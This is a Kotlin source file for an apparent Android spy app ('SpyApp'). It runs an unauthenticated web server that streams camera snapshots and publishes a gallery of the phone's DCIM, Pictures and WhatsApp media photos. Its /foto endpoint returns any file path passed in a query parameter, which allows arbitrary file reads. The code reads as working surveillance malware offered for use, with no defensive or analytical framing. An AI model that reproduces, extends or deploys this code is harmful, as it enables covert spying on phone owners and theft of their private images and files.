package com.spy.app

import android.content.Context
import android.os.Environment
import fi.iki.elonen.NanoHTTPD
import fi.iki.elonen.NanoHTTPD$Session
import java.io.File
import java.io.InputStream

class HttpServer(
    port: Int,
    private val ctx: Context,
    private val camera: CameraController
) : NanoHTTPD(port) {

    override fun serve(session: Session): Response {
        return when {
            session.uri == "/" -> newFixedLengthResponse(
                "<html><body style='font-family:sans-serif'>" +
                "<h1>SpyApp activo</h1>" +
                "<h2>Camara</h2>" +
                "<img src='/cam' width='400'><br><br>" +
                "<h2>Fotos</h2>" +
                "<a href='/fotos'>Ver galeria</a>" +
                "</body></html>"
            )

            session.uri == "/cam" -> {
                val f = File(ctx.filesDir, "shot.jpg")
                if (f.exists())
                    newChunkedResponse(Response.Status.OK, "image/jpeg", f.inputStream())
                else newFixedLengthResponse("sin foto todavia")
            }

            session.uri == "/fotos" -> {
                val fotos = listarFotos()
                val html = StringBuilder(
                    "<html><body style='font-family:sans-serif'>" +
                    "<h1>Galeria (${fotos.size} fotos)</h1>"
                )
                fotos.forEach { f ->
                    html.append(
                        "<div style='display:inline-block;margin:5px'>" +
                        "<img src='/foto?p=${f.absolutePath}' width='200'>" +
                        "<br><small>${f.name}</small></div>"
                    )
                }
                html.append("</body></html>")
                newFixedLengthResponse(html.toString())
            }

            session.uri.startsWith("/foto") -> {
                val path = session.parameters["p"]?.firstOrNull()
                val f = path?.let { File(it) }
                if (f != null && f.exists())
                    newChunkedResponse(Response.Status.OK, "image/jpeg", f.inputStream())
                else newFixedLengthResponse("no encontrada")
            }

            else -> newFixedLengthResponse("404")
        }
    }

    private fun listarFotos(): List<File> {
        val dirs = listOf(
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
            File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media")
        )
        return dirs.filter { it.exists() }
            .flatMap { it.walkTopDown().toList() }
            .filter {
                it.isFile && it.extension.lowercase() in
                    listOf("jpg", "jpeg", "png", "webp")
            }
            .sortedByDescending { it.lastModified() }
    }
}
